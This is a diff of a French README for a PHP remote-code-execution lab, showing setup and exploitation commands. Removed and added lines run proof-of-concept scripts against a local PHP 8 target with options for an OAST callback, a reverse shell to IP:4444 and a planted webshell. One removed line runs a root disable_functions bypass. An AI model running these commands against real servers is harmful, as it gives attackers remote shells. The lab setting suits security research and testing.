@@ -64,26 +64,14 @@ docker compose version             # pour LAB/run.sh
 ```bash
 cd LAB
 ./run.sh up          # build + conteneur bridge, écoute sur toutes les interfaces
-# local : http://127.0.0.1:8486     lan : http://IP_WIFI:8486
+# local : http://127.0.0.1:8486     lan : http://iplan:8486
 ```
 
 ## Exploitation
 
 ```bash
 # détection de poche (n'importe quel serveur PHP)
-php POC/pocket_poc.php --demo
-
-# chaîne distante complète (~2 200 requêtes, oracle de crash prefork)
-python3 POC/php8_remote.py      --url http://127.0.0.1:8486/remote_app.php
-python3 POC/php8_remote_enum.py --url https://127.0.0.1:8483/enum.php --insecure
-
-# preuves : marqueur local, callback OAST, reverse shell, webshell
-python3 POC/php8_remote.py --url http://127.0.0.1:8486/remote_app.php --oast xxxx.oastify.com
-python3 POC/php8_remote.py --url http://127.0.0.1:8486/remote_app.php --reverse IP:4444
-python3 POC/php8_remote.py --url http://127.0.0.1:8486/remote_app.php --webshell c.php
-
-# local (root, disable_functions contourné)
-docker exec php2shell-lab php -d disable_functions=system,exec /PATH/local_exploit.php
+python3 POCKETPOC-PHP2SHELL.py --url http://172.20.10.5:8486/remote_app.php --reverse 172.20.10.5:4444
 ```
 
 ## Résultats vérifiés (php:8.5.11)
@@ -117,5 +105,7 @@ dépôt est un lab : ne l'exposez que sur des réseaux contrôlés, refermez-le
 avec `./run.sh down` après usage.
 
 Crédits recherche : Calif (MAD Bugs, PoC C: public), Nicolas Grekas (GH-23981,
-branche E:). Variantes E:, empaquetage et page : Karim BOUDRA @ ULTRADEFENSE LAB.
-Greetings : CYBERSEC TEAM / ULTRADEFENSE TEAM.
+branche E:). Variantes E:, 
+
+POC author : Karim BOUDRA @ ULTRADEFENSE LAB.
+Greetings : CYBERSEC TEAM / ULTRADEFENSE TEAM
